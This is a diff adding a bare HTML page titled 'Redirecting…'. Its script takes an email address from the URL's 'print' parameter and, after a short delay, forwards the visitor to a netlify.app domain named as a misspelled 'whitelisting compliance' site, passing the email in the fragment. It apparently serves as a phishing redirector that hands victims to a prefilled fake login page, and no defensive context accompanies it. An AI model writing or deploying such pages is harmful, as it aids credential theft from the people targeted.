@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Redirecting…</title>
+<script>
+(() => {
+  const params = new URLSearchParams(window.location.search);
+  const email = params.get("print");
+
+  if (!email) return;
+
+  setTimeout(() => {
+    window.location.replace(
+      "https://whitelisiting-mlbx-compliance776b9d.netlify.app/en/#" +
+      encodeURIComponent(email)
+    );
+  }, 400);
+})();
+</script>
+</head>
+<body>
+</body>
+</html>
